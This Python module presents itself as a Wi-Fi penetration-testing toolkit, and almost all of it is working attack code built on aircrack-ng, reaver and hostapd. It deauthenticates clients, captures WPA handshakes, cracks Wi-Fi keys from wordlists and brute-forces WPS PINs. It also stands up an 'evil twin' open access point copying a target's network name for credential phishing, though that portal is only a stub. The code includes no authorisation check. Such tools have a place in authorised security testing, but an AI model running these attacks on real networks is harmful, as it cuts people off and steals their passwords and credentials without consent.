#!/usr/bin/env python3
"""
WiFi Security Testing Module
Comprehensive WiFi penetration testing including WPA/WPA2/WPA3 cracking,
evil twin attacks, deauth attacks, KARMA, and Bluetooth LE testing.
"""

import subprocess
import time
import re
import json
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import random
import string


class WiFiSecurity(Enum):
    """WiFi security types"""
    OPEN = "Open"
    WEP = "WEP"
    WPA = "WPA"
    WPA2 = "WPA2"
    WPA3 = "WPA3"
    WPA2_ENTERPRISE = "WPA2-Enterprise"
    WPA3_ENTERPRISE = "WPA3-Enterprise"


class AttackType(Enum):
    """WiFi attack types"""
    DEAUTH = "Deauthentication"
    EVIL_TWIN = "Evil Twin AP"
    KARMA = "KARMA Attack"
    WPS_PIN = "WPS PIN Cracking"
    HANDSHAKE_CAPTURE = "Handshake Capture"
    PMKID = "PMKID Attack"
    CAPTIVE_PORTAL = "Captive Portal Phishing"


@dataclass
class WiFiNetwork:
    """WiFi network information"""
    bssid: str  # MAC address
    essid: str  # Network name
    channel: int
    security: WiFiSecurity
    signal_strength: int  # dBm
    clients: List[str] = field(default_factory=list)  # Connected client MACs
    encryption: str = ""
    cipher: str = ""
    authentication: str = ""
    wps_enabled: bool = False
    
    def to_dict(self) -> Dict:
        return {
            "bssid": self.bssid,
            "essid": self.essid,
            "channel": self.channel,
            "security": self.security.value,
            "signal_strength": self.signal_strength,
            "clients": self.clients,
            "encryption": self.encryption,
            "cipher": self.cipher,
            "authentication": self.authentication,
            "wps_enabled": self.wps_enabled
        }


@dataclass
class WiFiClient:
    """WiFi client device"""
    mac: str
    bssid: str  # Connected AP
    signal_strength: int
    packets: int = 0
    manufacturer: str = ""


class WiFiScanner:
    """WiFi network scanner using aircrack-ng suite"""
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.monitor_mode = False
        self.tools_available = self._check_tools()
        
    def _check_tools(self) -> Dict[str, bool]:
        """Check if required tools are installed"""
        tools = {
            "airmon-ng": False,
            "airodump-ng": False,
            "aireplay-ng": False,
            "aircrack-ng": False,
            "reaver": False,
            "wash": False,
            "hostapd": False,
            "dnsmasq": False
        }
        
        for tool in tools.keys():
            try:
                result = subprocess.run(
                    [tool, "--help"],
                    capture_output=True,
                    timeout=5
                )
                tools[tool] = result.returncode in [0, 1]  # Some tools return 1 on --help
            except (FileNotFoundError, subprocess.TimeoutExpired):
                tools[tool] = False
        
        return tools
    
    def enable_monitor_mode(self) -> bool:
        """Enable monitor mode on wireless interface"""
        if not self.tools_available.get("airmon-ng"):
            print("‚ùå airmon-ng not found. Install: sudo apt install aircrack-ng")
            return False
        
        try:
            # Kill interfering processes
            subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, timeout=10)
            
            # Enable monitor mode
            result = subprocess.run(
                ["airmon-ng", "start", self.interface],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # Check if monitor interface was created (usually wlan0mon)
            if "monitor mode enabled" in result.stdout.lower():
                # Update interface name to monitor mode interface
                if "mon" in result.stdout:
                    self.interface = f"{self.interface}mon"
                self.monitor_mode = True
                print(f"‚úÖ Monitor mode enabled on {self.interface}")
                return True
            else:
                print(f"‚ö†Ô∏è Monitor mode may not be enabled: {result.stdout}")
                return False
                
        except Exception as e:
            print(f"‚ùå Failed to enable monitor mode: {e}")
            return False
    
    def disable_monitor_mode(self) -> bool:
        """Disable monitor mode"""
        if not self.monitor_mode:
            return True
        
        try:
            # Remove 'mon' suffix if present
            original_interface = self.interface.replace("mon", "")
            
            subprocess.run(
                ["airmon-ng", "stop", self.interface],
                capture_output=True,
                timeout=10
            )
            
            self.interface = original_interface
            self.monitor_mode = False
            print(f"‚úÖ Monitor mode disabled on {self.interface}")
            return True
        except Exception as e:
            print(f"‚ùå Failed to disable monitor mode: {e}")
            return False
    
    def scan_networks(self, duration: int = 30, channel: Optional[int] = None) -> List[WiFiNetwork]:
        """
        Scan for WiFi networks
        
        Args:
            duration: Scan duration in seconds
            channel: Specific channel to scan (1-14), or None for all channels
        """
        if not self.monitor_mode:
            print("‚ö†Ô∏è Monitor mode not enabled. Attempting to enable...")
            if not self.enable_monitor_mode():
                return []
        
        if not self.tools_available.get("airodump-ng"):
            print("‚ùå airodump-ng not found")
            return []
        
        print(f"üîç Scanning WiFi networks for {duration} seconds...")
        
        # Create temp directory for airodump output
        import tempfile
        temp_dir = Path(tempfile.mkdtemp())
        output_prefix = temp_dir / "scan"
        
        try:
            # Build command
            cmd = ["airodump-ng", self.interface, "-w", str(output_prefix), "--output-format", "csv"]
            
            if channel:
                cmd.extend(["-c", str(channel)])
            
            # Run airodump-ng for specified duration
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(duration)
            process.terminate()
            time.sleep(1)
            
            # Parse CSV output
            csv_file = output_prefix.with_suffix(".csv-01.csv")
            if not csv_file.exists():
                csv_file = Path(str(output_prefix) + "-01.csv")
            
            networks = self._parse_airodump_csv(csv_file)
            
            print(f"‚úÖ Found {len(networks)} networks")
            return networks
            
        except Exception as e:
            print(f"‚ùå Scan failed: {e}")
            return []
        finally:
            # Cleanup temp files
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
    
    def _parse_airodump_csv(self, csv_file: Path) -> List[WiFiNetwork]:
        """Parse airodump-ng CSV output"""
        networks = []
        
        if not csv_file.exists():
            return networks
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # Find the section with APs (between first line and "Station MAC")
            ap_section = []
            for line in lines:
                if "Station MAC" in line:
                    break
                ap_section.append(line)
            
            # Skip header lines
            for i, line in enumerate(ap_section):
                if "BSSID" in line:
                    ap_section = ap_section[i+1:]
                    break
            
            # Parse each network
            for line in ap_section:
                parts = [p.strip() for p in line.split(',')]
                
                if len(parts) < 14 or not parts[0]:
                    continue
                
                try:
                    bssid = parts[0]
                    channel = int(parts[3]) if parts[3].isdigit() else 0
                    signal = int(parts[8]) if parts[8].lstrip('-').isdigit() else -100
                    encryption = parts[5]
                    cipher = parts[6]
                    auth = parts[7]
                    essid = parts[13]
                    
                    # Determine security type
                    security = WiFiSecurity.OPEN
                    if "WPA3" in encryption:
                        security = WiFiSecurity.WPA3
                    elif "WPA2" in encryption:
                        security = WiFiSecurity.WPA2
                    elif "WPA" in encryption:
                        security = WiFiSecurity.WPA
                    elif "WEP" in encryption:
                        security = WiFiSecurity.WEP
                    
                    network = WiFiNetwork(
                        bssid=bssid,
                        essid=essid,
                        channel=channel,
                        security=security,
                        signal_strength=signal,
                        encryption=encryption,
                        cipher=cipher,
                        authentication=auth
                    )
                    
                    networks.append(network)
                except (ValueError, IndexError):
                    continue
            
        except Exception as e:
            print(f"‚ö†Ô∏è Error parsing CSV: {e}")
        
        return networks


class WiFiAttacker:
    """WiFi attack tools"""
    
    def __init__(self, interface: str = "wlan0mon"):
        self.interface = interface
        self.scanner = WiFiScanner(interface)
    
    def deauth_attack(self, target_bssid: str, client_mac: Optional[str] = None,
                      count: int = 10) -> bool:
        """
        Deauthentication attack to disconnect clients
        
        Args:
            target_bssid: Target AP MAC address
            client_mac: Specific client MAC to deauth (or None for broadcast)
            count: Number of deauth packets to send
        """
        if not self.scanner.tools_available.get("aireplay-ng"):
            print("‚ùå aireplay-ng not found")
            return False
        
        print(f"üí• Launching deauth attack on {target_bssid}")
        
        try:
            cmd = [
                "aireplay-ng",
                "--deauth", str(count),
                "-a", target_bssid
            ]
            
            if client_mac:
                cmd.extend(["-c", client_mac])
                print(f"   Target client: {client_mac}")
            else:
                print(f"   Broadcast deauth (all clients)")
            
            cmd.append(self.interface)
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                print(f"‚úÖ Deauth attack completed")
                return True
            else:
                print(f"‚ö†Ô∏è Deauth may have failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"‚ùå Deauth attack failed: {e}")
            return False
    
    def capture_handshake(self, target_network: WiFiNetwork,
                         output_file: Path, timeout: int = 300) -> bool:
        """
        Capture WPA/WPA2 handshake
        
        Args:
            target_network: Target WiFi network
            output_file: Output file for handshake
            timeout: Max time to wait for handshake (seconds)
        """
        print(f"üéØ Capturing handshake for {target_network.essid}")
        print(f"   Channel: {target_network.channel}")
        print(f"   BSSID: {target_network.bssid}")
        
        try:
            # Start airodump-ng to capture handshake
            cmd = [
                "airodump-ng",
                "-c", str(target_network.channel),
                "--bssid", target_network.bssid,
                "-w", str(output_file.with_suffix('')),
                self.interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            print(f"‚è≥ Waiting for handshake (timeout: {timeout}s)...")
            print(f"   Tip: Sending deauth packets may speed up capture")
            
            # Optionally send deauth to force reconnection
            time.sleep(5)
            self.deauth_attack(target_network.bssid, count=5)
            
            # Wait for handshake or timeout
            start_time = time.time()
            handshake_captured = False
            
            while time.time() - start_time < timeout:
                # Check if handshake was captured
                # (This is simplified - real implementation would parse airodump output)
                time.sleep(10)
                
                # Send periodic deauth
                if int(time.time() - start_time) % 30 == 0:
                    self.deauth_attack(target_network.bssid, count=3)
            
            process.terminate()
            
            # Check if .cap file exists
            cap_file = output_file.with_suffix('.cap-01.cap')
            if not cap_file.exists():
                cap_file = Path(str(output_file.with_suffix('')) + '-01.cap')
            
            if cap_file.exists():
                print(f"‚úÖ Handshake capture saved: {cap_file}")
                return True
            else:
                print(f"‚ö†Ô∏è No handshake captured")
                return False
                
        except Exception as e:
            print(f"‚ùå Handshake capture failed: {e}")
            return False
    
    def crack_wpa(self, handshake_file: Path, wordlist: Path,
                  essid: Optional[str] = None) -> Optional[str]:
        """
        Crack WPA/WPA2 password from handshake
        
        Args:
            handshake_file: .cap file with handshake
            wordlist: Password wordlist
            essid: Network ESSID (optional)
        """
        if not self.scanner.tools_available.get("aircrack-ng"):
            print("‚ùå aircrack-ng not found")
            return None
        
        print(f"üîì Cracking WPA password...")
        print(f"   Handshake: {handshake_file}")
        print(f"   Wordlist: {wordlist}")
        
        try:
            cmd = [
                "aircrack-ng",
                "-w", str(wordlist),
                str(handshake_file)
            ]
            
            if essid:
                cmd.extend(["-e", essid])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=3600  # 1 hour timeout
            )
            
            # Parse output for password
            if "KEY FOUND!" in result.stdout:
                # Extract password from output
                match = re.search(r'KEY FOUND! \[ (.*?) \]', result.stdout)
                if match:
                    password = match.group(1)
                    print(f"‚úÖ Password found: {password}")
                    return password
            
            print(f"‚ö†Ô∏è Password not found in wordlist")
            return None
            
        except subprocess.TimeoutExpired:
            print(f"‚è∞ Cracking timeout (1 hour)")
            return None
        except Exception as e:
            print(f"‚ùå Cracking failed: {e}")
            return None
    
    def wps_scan(self, bssid: Optional[str] = None) -> List[Dict]:
        """
        Scan for WPS-enabled networks
        
        Args:
            bssid: Specific BSSID to check, or None for all
        """
        if not self.scanner.tools_available.get("wash"):
            print("‚ùå wash not found. Install: sudo apt install reaver")
            return []
        
        print(f"üîç Scanning for WPS-enabled networks...")
        
        try:
            cmd = ["wash", "-i", self.interface]
            
            if bssid:
                cmd.extend(["-b", bssid])
            
            # Run wash for 30 seconds
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(30)
            process.terminate()
            stdout, _ = process.communicate()
            
            # Parse output
            wps_networks = []
            lines = stdout.strip().split('\n')
            
            for line in lines[2:]:  # Skip header
                if not line.strip():
                    continue
                
                parts = line.split()
                if len(parts) >= 6:
                    wps_networks.append({
                        "bssid": parts[0],
                        "channel": parts[1],
                        "signal": parts[2],
                        "wps_version": parts[3],
                        "wps_locked": parts[4],
                        "essid": ' '.join(parts[5:])
                    })
            
            print(f"‚úÖ Found {len(wps_networks)} WPS-enabled networks")
            return wps_networks
            
        except Exception as e:
            print(f"‚ùå WPS scan failed: {e}")
            return []
    
    def wps_crack(self, bssid: str, channel: int) -> Optional[str]:
        """
        Crack WPS PIN using Reaver
        
        Args:
            bssid: Target AP BSSID
            channel: WiFi channel
        """
        if not self.scanner.tools_available.get("reaver"):
            print("‚ùå reaver not found. Install: sudo apt install reaver")
            return None
        
        print(f"üîì Cracking WPS PIN for {bssid}")
        print(f"‚ö†Ô∏è This may take several hours...")
        
        try:
            cmd = [
                "reaver",
                "-i", self.interface,
                "-b", bssid,
                "-c", str(channel),
                "-vv"
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Monitor output for PIN
            for line in process.stdout:
                print(f"   {line.strip()}")
                
                if "WPS PIN:" in line:
                    match = re.search(r'WPS PIN: \'(\d+)\'', line)
                    if match:
                        pin = match.group(1)
                        print(f"‚úÖ WPS PIN found: {pin}")
                        return pin
                
                if "WPA PSK:" in line:
                    match = re.search(r'WPA PSK: \'(.+?)\'', line)
                    if match:
                        password = match.group(1)
                        print(f"‚úÖ Password found: {password}")
            
            return None
            
        except Exception as e:
            print(f"‚ùå WPS cracking failed: {e}")
            return None


class EvilTwinAP:
    """Create fake access point (Evil Twin attack)"""
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.hostapd_conf = None
        self.dnsmasq_conf = None
        self.process = None
    
    def create_fake_ap(self, essid: str, channel: int = 6,
                       capture_creds: bool = True) -> bool:
        """
        Create fake AP with same ESSID as target
        
        Args:
            essid: Network name (same as target for evil twin)
            channel: WiFi channel
            capture_creds: Enable credential capture portal
        """
        print(f"üëø Creating Evil Twin AP: {essid}")
        print(f"   Channel: {channel}")
        
        try:
            import tempfile
            
            # Create hostapd configuration
            self.hostapd_conf = Path(tempfile.mktemp(suffix='.conf'))
            
            config = f"""
interface={self.interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
            
            if capture_creds:
                # Open network for easy connection
                config += """
auth_algs=1
wpa=0
"""
            
            with open(self.hostapd_conf, 'w') as f:
                f.write(config)
            
            # Start hostapd
            cmd = ["hostapd", str(self.hostapd_conf)]
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(3)
            
            if self.process.poll() is None:
                print(f"‚úÖ Evil Twin AP started")
                
                if capture_creds:
                    print(f"üé£ Captive portal for credential phishing:")
                    print(f"   Setup web server with fake login page")
                
                return True
            else:
                print(f"‚ùå Failed to start Evil Twin AP")
                return False
                
        except Exception as e:
            print(f"‚ùå Evil Twin creation failed: {e}")
            return False
    
    def stop(self):
        """Stop Evil Twin AP"""
        if self.process:
            self.process.terminate()
            self.process.wait()
            print(f"‚úÖ Evil Twin AP stopped")
        
        if self.hostapd_conf and self.hostapd_conf.exists():
            self.hostapd_conf.unlink()


class BluetoothScanner:
    """Bluetooth LE scanning and testing"""
    
    def __init__(self):
        self.bluez_available = self._check_bluez()
    
    def _check_bluez(self) -> bool:
        """Check if BlueZ tools are available"""
        try:
            result = subprocess.run(
                ["hcitool", "--help"],
                capture_output=True,
                timeout=5
            )
            return result.returncode in [0, 1]
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False
    
    def scan_devices(self, duration: int = 10) -> List[Dict]:
        """
        Scan for Bluetooth devices
        
        Args:
            duration: Scan duration in seconds
        """
        if not self.bluez_available:
            print("‚ùå BlueZ not found. Install: sudo apt install bluez")
            return []
        
        print(f"üîç Scanning for Bluetooth devices ({duration}s)...")
        
        try:
            cmd = ["hcitool", "scan", "--flush"]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=duration + 5
            )
            
            devices = []
            lines = result.stdout.strip().split('\n')
            
            for line in lines[1:]:  # Skip header
                if not line.strip():
                    continue
                
                parts = line.split(maxsplit=1)
                if len(parts) == 2:
                    devices.append({
                        "mac": parts[0],
                        "name": parts[1]
                    })
            
            print(f"‚úÖ Found {len(devices)} Bluetooth devices")
            return devices
            
        except Exception as e:
            print(f"‚ùå Bluetooth scan failed: {e}")
            return []


def main():
    """Demo WiFi pentesting"""
    
    print("="*60)
    print("WIFI SECURITY TESTING DEMO")
    print("="*60)
    
    # Check for root/admin
    import os
    if os.geteuid() != 0:
        print("‚ö†Ô∏è This module requires root/administrator privileges")
        print("   Run with: sudo python wifi_pentest.py")
        return
    
    # Initialize scanner
    scanner = WiFiScanner("wlan0")
    
    # Enable monitor mode
    if scanner.enable_monitor_mode():
        # Scan networks
        networks = scanner.scan_networks(duration=10)
        
        if networks:
            print(f"\nüì° Discovered Networks:\n")
            for net in networks[:10]:  # Show top 10
                print(f"  {net.essid:30s} | {net.bssid} | Ch {net.channel:2d} | {net.security.value:10s} | {net.signal_strength} dBm")
        
        # Disable monitor mode
        scanner.disable_monitor_mode()
    
    # Bluetooth scan
    bt_scanner = BluetoothScanner()
    bt_devices = bt_scanner.scan_devices(duration=10)
    
    if bt_devices:
        print(f"\nüì± Bluetooth Devices:\n")
        for device in bt_devices:
            print(f"  {device['mac']} | {device['name']}")


if __name__ == "__main__":
    main()
